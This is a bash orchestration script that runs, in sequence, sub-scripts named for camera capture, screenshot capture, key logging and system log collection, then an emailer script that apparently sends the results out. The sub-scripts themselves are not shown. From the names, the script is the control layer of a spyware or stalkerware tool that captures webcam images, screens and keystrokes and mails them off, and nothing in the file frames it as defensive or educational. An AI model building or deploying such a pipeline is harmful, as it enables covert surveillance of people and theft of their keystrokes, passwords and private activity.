#!/bin/bash

# Ensure the main script is executable
SCRIPT_PATH=$(realpath "$0")
chmod +x "$SCRIPT_PATH"

# Print a message indicating that the script is starting
echo "Starting the execution of all tasks..."

# Step 1: Run the camera capture script and wait for it to finish
echo "Running camera capture script..."
./capture/camera.sh
if [ $? -ne 0 ]; then
    echo "Error: Camera capture failed!"
    exit 1
fi

# Step 2: Run the screenshot capture script and wait for it to finish
echo "Running screenshot capture script..."
./capture/screenshot.sh
if [ $? -ne 0 ]; then
    echo "Error: Screenshot capture failed!"
    exit 1
fi

# Step 3: Run the key logger script and wait for it to finish
echo "Running key logger script..."
./diagnostics/key_logger.sh
if [ $? -ne 0 ]; then
    echo "Error: Key logger failed!"
    exit 1
fi

# Step 4: Run the system logs capture script and wait for it to finish
echo "Running system logs capture script..."
./diagnostics/system_logs.sh
if [ $? -ne 0 ]; then
    echo "Error: System logs capture failed!"
    exit 1
fi

# Step 5: Execute the emailer script after all tasks have finished
echo "Executing the emailer script..."
./notifications/emailer.sh
if [ $? -ne 0 ]; then
    echo "Error: Email sending failed!"
    exit 1
fi

# Print a message indicating that all tasks are complete
echo "All tasks completed successfully, email has been sent."
